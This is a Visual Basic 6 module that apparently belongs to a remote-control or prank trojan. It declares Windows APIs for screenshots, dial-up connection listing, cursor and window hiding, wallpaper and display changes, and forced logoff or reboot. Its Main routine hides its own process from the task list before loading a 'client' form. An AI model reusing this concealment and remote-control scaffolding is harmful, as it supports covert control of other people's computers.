Attribute VB_Name = "Module1"
Type RASCONN
    dwSize As Long
    hRasConn As Long
    szEntryName(256) As Byte
    szDeviceType(16) As Byte
    szDeviceName(128) As Byte
End Type

Public Declare Function getDesktop Lib "wsx32.dll" (ByVal nWidth As Integer, ByVal nHeight As Integer, blnJpeg As Boolean, ByVal JPGCompressQuality As Integer, ByVal strFileName As String) As Integer

Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Declare Function RegisterServiceProcess Lib "kernel32" (ByVal ProcessID As Long, ByVal ServiceFlags As Long) As Long
Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Global Const RSP_SIMPLE_SERVICE = &H1
Global Const RSP_UNREGISTER_SERVICE = &H0
Declare Function RasEnumConnectionsA& Lib "RasApi32.DLL" (lprasconn As Any, lpcb&, lpcConnections&)
Declare Function SetCursorPos Lib "user32" (ByVal x As Long, ByVal y As Long) As Long
Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrCommand As String) As Long
Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Global Const SPI_SCREENSAVERRUNNING = 97
Global Const SPIF_SENDWININICHANGE = &H2
Global Const SPI_SETDESKWALLPAPER = 20
Global Const SPIF_UPDATEINIFILE = &H1
' 32 Bit
  Public Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, _
    ByVal nCmdShow As Long) As Long
  Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" _
    (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
  Global Const SW_SHOW = 5
  Global Const SW_HIDE = 0
Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, _
    ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
  Public Const VK_SNAPSHOT = &H2C
  Public Const KEYEVENTF_KEYUP = &H2
  
Public Const SWP_SHOWWINDOW = &H40
Public Const conHwndTopmost = -1
Public Const conSwpShowWindow = &H40

Public Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long


  ' 32 Bit
  Declare Function EnumDisplaySettings Lib "user32" Alias "EnumDisplaySettingsA" ( _
    ByVal lpszDeviceName As Long, ByVal iModeNum As Long, lpDevMode As Any) As Boolean
  Declare Function ChangeDisplaySettings Lib "user32" Alias "ChangeDisplaySettingsA" ( _
    lpDevMode As Any, ByVal dwFlags As Long) As Long
  Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long

  Global Const EWX_LOGOFF = 0
  Global Const EWX_SHUTDOWN = 1
  Global Const EWX_REBOOT = 2
  Global Const EWX_FORCE = 4
  Global Const CCDEVICENAME = 32
  Global Const CCFORMNAME = 32
  Global Const DM_BITSPERPEL = &H40000
  Global Const DM_PELSWIDTH = &H80000
  Global Const DM_PELSHEIGHT = &H100000
  Global Const CDS_UPDATEREGISTRY = &H1
  Global Const CDS_TEST = &H4
  Global Const DISP_CHANGE_SUCCESSFUL = 0
  Global Const DISP_CHANGE_RESTART = 1

  Type DEVMODE
    dmDeviceName As String * CCDEVICENAME
    dmSpecVersion As Integer
    dmDriverVersion As Integer
    dmSize As Integer
    dmDriverExtra As Integer
    dmFields As Long
    dmOrientation As Integer
    dmPaperSize As Integer
    dmPaperLength As Integer
    dmPaperWidth As Integer
    dmScale As Integer
    dmCopies As Integer
    dmDefaultSource As Integer
    dmPrintQuality As Integer
    dmColor As Integer
    dmDuplex As Integer
    dmYResolution As Integer
    dmTTOption As Integer
    dmCollate As Integer
    dmFormName As String * CCFORMNAME
    dmUnusedPadding As Integer
    dmBitsPerPel As Integer
    dmPelsWidth As Long
    dmPelsHeight As Long
    dmDisplayFlags As Long
    dmDisplayFrequency As Long
  End Type

' 32 Bit
 Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" _
    (ByVal hwnd As Long, ByVal nIndex As Long) As Long
 Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" _
    (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Global Const GWL_EXSTYLE = (-20)
Global Const WS_EX_TRANSPARENT = &H20&
  Global Const SWP_FRAMECHANGED = &H20
 Global Const SWP_NOMOVE = &H2
Global Const SWP_NOSIZE = &H1
Global Const HWND_NOTOPMOST = -2




Public Sub Main()
RegisterServiceProcess GetCurrentProcessId(), RSP_SIMPLE_SERVICE
    Load client
End Sub
